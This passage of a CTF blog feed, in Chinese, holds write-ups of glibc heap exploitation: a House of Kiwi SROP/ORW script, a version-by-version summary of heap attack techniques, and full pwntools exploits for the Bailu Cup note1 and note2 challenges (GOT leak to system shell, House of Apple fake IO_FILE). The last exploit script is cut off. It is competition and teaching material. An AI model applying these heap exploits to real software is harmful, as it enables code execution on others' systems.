p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)</span><br><span class="line">edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)</span><br><span class="line">add(0, 0x410)</span><br><span class="line">add(2, 0x420)</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line"># largebin attack guard</span><br><span class="line">delete(2)</span><br><span class="line">add(6, 0x430)</span><br><span class="line">delete(0)</span><br><span class="line">edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))</span><br><span class="line">add(7, 0x450)</span><br><span class="line">edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)</span><br><span class="line">edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)</span><br><span class="line">add(2, 0x420)</span><br><span class="line">add(0, 0x410)</span><br><span class="line"></span><br><span class="line"># change top chunk size</span><br><span class="line">delete(7)</span><br><span class="line">add(8, 0x430)</span><br><span class="line">edit(7, 'a' * 0x438 + p64(0x300))</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line">next_chain = 0</span><br><span class="line">srop_addr = heap_base + 0x2ae0 + 0x10</span><br><span class="line">fake_IO_FILE = 2 * p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_write_base = 0</span><br><span class="line">fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_base</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_end</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\x00')</span><br><span class="line">fake_IO_FILE += p64(next_chain)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')</span><br><span class="line">fake_IO_FILE += p64(heap_base)  # _lock = writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')</span><br><span class="line">fake_IO_FILE += p64(0)  # _mode = 0</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')</span><br><span class="line">fake_IO_FILE += p64(libc.sym['_IO_cookie_jumps'] + 0x40)  # vtable</span><br><span class="line">fake_IO_FILE += p64(srop_addr)  # rdi</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))</span><br><span class="line"></span><br><span class="line">fake_frame_addr = srop_addr</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = fake_frame_addr + 0xF8</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0x100</span><br><span class="line">frame.rsp = fake_frame_addr + 0xF8 + 0x10</span><br><span class="line">frame.rip = pop_rdi_addr + 1  # : ret</span><br><span class="line"></span><br><span class="line">rop_data = [</span><br><span class="line">    pop_rax_addr,  # sys_open('flag', 0)</span><br><span class="line">    2,</span><br><span class="line">    syscall_addr,</span><br><span class="line"></span><br><span class="line">    pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)</span><br><span class="line">    0,</span><br><span class="line">    pop_rdi_addr,</span><br><span class="line">    3,</span><br><span class="line">    pop_rsi_addr,</span><br><span class="line">    fake_frame_addr + 0x200,</span><br><span class="line">    syscall_addr,</span><br><span class="line"></span><br><span class="line">    pop_rax_addr,  # sys_write(1, heap, 0x100)</span><br><span class="line">    1,</span><br><span class="line">    pop_rdi_addr,</span><br><span class="line">    1,</span><br><span class="line">    pop_rsi_addr,</span><br><span class="line">    fake_frame_addr + 0x200,</span><br><span class="line">    syscall_addr</span><br><span class="line">]</span><br><span class="line">payload = p64(0) + p64(fake_frame_addr) + '\x00' * 0x10 + p64(setcontext_addr + 61)</span><br><span class="line">payload += str(frame).ljust(0xF8, '\x00')[0x28:] + 'flag'.ljust(0x10, '\x00') + flat(rop_data)</span><br><span class="line"></span><br><span class="line">edit(0, fake_IO_FILE)</span><br><span class="line">edit(2, payload)</span><br><span class="line"></span><br><span class="line">add(8, 0x450)  # House OF Kiwi</span><br><span class="line"># gdb.attach(sh, "b _IO_cookie_write")</span><br><span class="line">run_opcode()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h1&gt;&lt;h2 id=&quot;large-bin-attack&quot;&gt;&lt;a href=&quot;#large-bin-attack&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>堆利用总结</title>
    <link href="http://wscyoulin.github.io/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://wscyoulin.github.io/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2022-10-02T03:12:46.000Z</published>
    <updated>2022-10-02T12:03:28.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="libc-2-23"><a href="#libc-2-23" class="headerlink" title="libc-2.23"></a>libc-2.23</h1><ol><li>在libc2.23的版本下最常用的利用方法就是利用fastbin attack打malloc_hook，写onegadget（注意需要找一个\x7f作为chunk的size字段即malloc_hook-0x23，绕过fastbin的检测）</li><li>劫持bss段的heap数组，劫持为free_hook，稳定getshell</li><li>在relro没完全开启的时候去劫持got表</li></ol><h1 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc-2.27"></a>libc-2.27</h1><p>2.27最大的变化就是引入了tcache，tcache bin和fastbin的管理方式很像，都采用FILO的单链表（理解为数据结构中的栈），但是tcache的优先级更高，并且在bin中，fastbin的fd指针指向上一个chunk的头部，而tcache会指向上一个chunk的数据部分。旧版libc2.27中，tcache结构体没有引入key指针，可以随意double free，基本上是指哪儿打哪儿，在UAF下，使得利用手法更为容易，并且在分配的过程中没有对size进行检查。</p><p>1.首先泄露libc基址时，可以填满7个0xa0的tcache，然后利用uaf泄露出unsorted bin的fd指针从而泄露出libc基址</p><p>2.如果对堆块大小申请没有限制也可以直接申请一个0x420的堆块释放成为largebin，也可以直接通过泄露出largebin 的fd指针来泄露出libc基址</p><p>tcache利用：因为tcache的fd指针是指向的userdata，不像fastbin的fd指针一样指向堆块的头部，所以可以直接通过double free形成的指哪打哪的效果，修改free_hook为system_addr，然后释放一个里面写了’/bin/sh\x00‘的堆块来获得shell</p><h1 id="libc-2-31"><a href="#libc-2-31" class="headerlink" title="libc-2.31"></a>libc-2.31</h1><p>新版libc2.27和2.31类似，引入了新的内容key，如果key值等于tcache的地址，那么就进入tcache的链表，然后后移，判断当前堆块是否在链表中，如果在链表中，那么很显然就是double free了。绕过方法很简单，利用漏洞改掉key值即可，直接给干掉if判断了，就不会进入这个if分支了。 在UAF下的利用手法为首先填满tcache，然后申请unsorted bin大小的chunk，利用UAF泄露libc基址，最后通过修改tcache的指针轻松的将堆块申请到__free_hook，修改为system地址，然后free一个chunk，chunk的内容为”/bin/shx00”即可轻松getshell。</p><h1 id="libc-2-32"><a href="#libc-2-32" class="headerlink" title="libc-2.32"></a>libc-2.32</h1><p>2.32引入了一个宏<code>PROTECT_PTR，加入了一个safelink机制</code>,检测了申请地址是否以0x10对齐,fastbin attack的利用方法受到限制,例如经典的错位构造’\x7f’，劫持malloc_hook,和IO_FILE的利用方法（基本上都开始采用tcache来任意申请堆块了）</p><p>并且在这个版本开始，还增加了一个堆tcache 的fd指针进行异或的加密,在UAF的场景下，我们可以直接用show即可泄露出e-&gt;next值，因为最初tcache链表是为空的，也就是说safe-linking机制只相当于用堆地址右移了12位，通过左移即可恢复出堆地址，从而泄露出堆的基址，泄露出堆地址以后就可以来伪造tcache的next位了，将想改写的地址和key异或一下就可以直接修改tcache的fd指针了，一样可以将tcache指向free_hook来获得shell</p><h1 id="libc-2-34（已经逐渐淘汰）"><a href="#libc-2-34（已经逐渐淘汰）" class="headerlink" title="libc-2.34（已经逐渐淘汰）"></a>libc-2.34（已经逐渐淘汰）</h1><p>移除了几个hook符号：</p><p>__free_hook</p><p>__malloc_hook</p><p>__realloc_hook</p><p>__memalign_hook</p><p>__after_morecore_hook</p><p>获得shell的几个方法：</p><p>1.泄露完libc之后，通过计算偏移来泄露出environ指针的内容，来泄露出栈的地址，在栈上写rop链</p><p>2.劫持exit_hook（注意2.34-0ubuntu3.2之后exit_hook也不行了）</p><h1 id="libc-2-35"><a href="#libc-2-35" class="headerlink" title="libc-2.35"></a>libc-2.35</h1><p>相关的虚表已经不可以写了</p><p>平常最常用的攻击手法就是house of banana,house of apple,house of cat</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;libc-2-23&quot;&gt;&lt;a href=&quot;#libc-2-23&quot; class=&quot;headerlink&quot; title=&quot;libc-2.23&quot;&gt;&lt;/a&gt;libc-2.23&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;在libc2.23的版本下最常用的利用方法就是利用fastbin att</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>柏鹭杯</title>
    <link href="http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <id>http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/</id>
    <published>2022-09-22T12:50:25.000Z</published>
    <updated>2022-10-02T06:23:09.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="柏鹭杯复现"><a href="#柏鹭杯复现" class="headerlink" title="柏鹭杯复现"></a>柏鹭杯复现</h1><h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./note1"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF("./libc.so.6")</span><br><span class="line">#libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def add(index,size,name,tag,func = 2):</span><br><span class="line">    sla("&gt; ",b'1')</span><br><span class="line">    sla("id: ",str(index))</span><br><span class="line">    sla("name_length: ",str(size))</span><br><span class="line">    sla("name: ",name)</span><br><span class="line">    sla("tag: ",tag)</span><br><span class="line">    sla("func: ",str(func))</span><br><span class="line"></span><br><span class="line">def edit_name(idx,size,name):</span><br><span class="line">    sla("&gt; ",b'2')</span><br><span class="line">    sla("id: ",str(idx))</span><br><span class="line">    sla("&gt; ",b'1')</span><br><span class="line">    sla("name_length: ",str(size))</span><br><span class="line">    io.sendlineafter("name: ",name)</span><br><span class="line"></span><br><span class="line">def edit_tag(idx,tag):</span><br><span class="line">    sla("&gt; ",b'2')</span><br><span class="line">    sla("id: ",str(idx))</span><br><span class="line">    sla("&gt; ",b'2')</span><br><span class="line">    io.sendafter("new tag: ",tag)</span><br><span class="line"></span><br><span class="line">def edit_func(idx,func):</span><br><span class="line">    sla("&gt; ",b'2')</span><br><span class="line">    sla("id: ",str(idx))</span><br><span class="line">    sla("&gt; ",b'3')</span><br><span class="line">    sla("func: ",str(func))</span><br><span class="line"></span><br><span class="line">def call(idx):</span><br><span class="line">    sla("&gt; ",b'3')</span><br><span class="line">    sla("id: ",str(idx))</span><br><span class="line"></span><br><span class="line">add(0,0x420,b'A'*0x420,b'')</span><br><span class="line">edit_tag(0, p64(0xdeadbeefdeadbeef))</span><br><span class="line">edit_func(0, 1)</span><br><span class="line">call(0)</span><br><span class="line"></span><br><span class="line">ru(b'\xef\xbe\xad\xde\xef\xbe\xad\xde')</span><br><span class="line">base=u64(io.recv(6).ljust(8, b'\x00'))-0x131b</span><br><span class="line">print("base:"+hex(base))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x10,b'youlin')</span><br><span class="line">add(1,0x10,b'youlin',b'')</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+p64(0)+p64(base+0x131b)+p64(base+elf.got['puts'])+p64(0x421))</span><br><span class="line"></span><br><span class="line">call(1)</span><br><span class="line">libcbase = uu64() - libc.sym['puts']</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line">bin_sh=libcbase+next(libc.search(b'/bin/sh'))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+b'/bin/sh'.ljust(0x8,b'\x00')+p64(system))</span><br><span class="line">call(1)</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><h2 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h2><p>比较简单的一道题，直接给了uaf，因为一开始用house of banana在本机一直打不通，刚好又看到pursue师傅的博客用的house of apple，刚好了解下house of apple</p><p>house of apple具体原理：<a href="https://zhuanlan.zhihu.com/p/549114257">https://zhuanlan.zhihu.com/p/549114257</a></p><p>先将_IO_list_all修改为堆上伪造io的地址，然后利用模板</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_file1 = b'\x00' * (0x10)</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_base</span><br><span class="line">fake_file1 += p64(1)    # fp -&gt; _IO_write_ptr</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_end</span><br><span class="line">fake_file1 = fake_file1.ljust(0x78, b'\x00')</span><br><span class="line">fake_file1 += p64(heapbase)     # _lock</span><br><span class="line">fake_file1 = fake_file1.ljust(0x90, b'\x00')</span><br><span class="line">fake_file1 += p64(heapbase + 0xf00 + 0x100)    # _wide_data</span><br><span class="line">fake_file1 = fake_file1.ljust(0xc8, b'\x00')</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      # vtable</span><br><span class="line">fake_file1 = fake_file1.ljust(0x100 - 0x10, b'\x00')</span><br><span class="line"></span><br><span class="line">fake_wide = b'\x00' * 0x68</span><br><span class="line">fake_wide += p64(ogg)     # _wide_vtable + 0x68</span><br><span class="line"># fake_wide = fake_wide.ljust(0xa0, b'\x00')</span><br><span class="line"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span><br><span class="line"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span><br><span class="line">fake_wide = fake_wide.ljust(0xe0, b'\x00')</span><br><span class="line">fake_wide += p64(heapbase + 0xf00 + 0x100)     # _wide_vtable</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./note2"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def add(idx, size, content):</span><br><span class="line">    sla('------------', b'1')</span><br><span class="line">    sla('Index?', str(idx))</span><br><span class="line">    sla('Size?', str(size))</span><br><span class="line">    sla('Enter content: ', content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sla('------------', b'2')</span><br><span class="line">    sla('Index?', str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla('------------', b'3')</span><br><span class="line">    sla('Index?', str(idx))</span><br><span class="line"></span><br><span class="line">def leave():</span><br><span class="line">    sla('------------', b'4')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    add(i,0x108,b'youlin')</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">show(1)</span><br><span class="line">r()</span><br><span class="line">key=u64(io.recv(5).ljust(8, b'\x00'))</span><br><span class="line">heapbase=key&lt;&lt;12</span><br><span class="line">print("heapbase:"+hex(heapbase))</span><br><span class="line"></span><br><span class="line">for i in range(2,8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libcbase=uu64()-0x219ce0</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">pop_rdi=libcbase+0x000000000002a3e5</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line">bin_sh=libcbase+next(libc.search(b'/bin/sh'))</span><br><span class="line">io_list_all = libcbase + libc.sym['_IO_list_all']</span><br><span class="line">io_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']</span><br><span class="line">ogg = libcbase + 0xebcf5</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    add(i, 0x108, b'youlin')</span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i, 0x68, b'youlin')</span><br><span class="line">for i in range(9):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(7)</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i, 0x68, b'youlin')</span><br><span class="line"></span><br><span class="line">add(0, 0x68, p64(key ^ io_list_all))</span><br><span class="line">add(1, 0x68, b'youlin')</span><br><span class="line">add(2, 0x68, b'youlin')</span><br><span class="line">add(3, 0x68, p64(heapbase + 0xf00))</span><br><span class="line"></span><br><span class="line">fake_file1 = b'\x00' * (0x10)</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_base</span><br><span class="line">fake_file1 += p64(1)    # fp -&gt; _IO_write_ptr</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_end</span><br><span class="line">fake_file1 = fake_file1.ljust(0x78, b'\x00')</span><br><span class="line">fake_file1 += p64(heapbase)     # _lock</span><br><span class="line">fake_file1 = fake_file1.ljust(0x90, b'\x00')</span><br><span class="line">fake_file1 += p64(heapbase + 0xf00 + 0x100)    # _wide_data</span><br><span class="line">fake_file1 = fake_file1.ljust(0xc8, b'\x00')</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      # vtable</span><br><span class="line">fake_file1 = fake_file1.ljust(0x100 - 0x10, b'\x00')</span><br><span class="line"></span><br><span class="line">fake_wide = b'\x00' * 0x68</span><br><span class="line">fake_wide += p64(ogg)     # _wide_vtable + 0x68</span><br><span class="line"># fake_wide = fake_wide.ljust(0xa0, b'\x00')</span><br><span class="line"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span><br><span class="line"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span><br><span class="line">fake_wide = fake_wide.ljust(0xe0, b'\x00')</span><br><span class="line">fake_wide += p64(heapbase + 0xf00 + 0x100)     # _wide_vtable</span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line"></span><br><span class="line">add(4, 0x200, fake_file1)</span><br><span class="line">leave()</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><p>经过不断的调试和pursue师傅的教学，发现是因为我本机的Ubuntu22.04和远程的环境不太一样（明明glibc版本都是Ubuntu GLIBC 2.35-0ubuntu3.1）具体原因不太清楚了，最后发现是_rtld_global和l_next两个需要伪造和修改的地址不一样</p><p>banana exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"># encoding = utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">banary = "./note2"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span 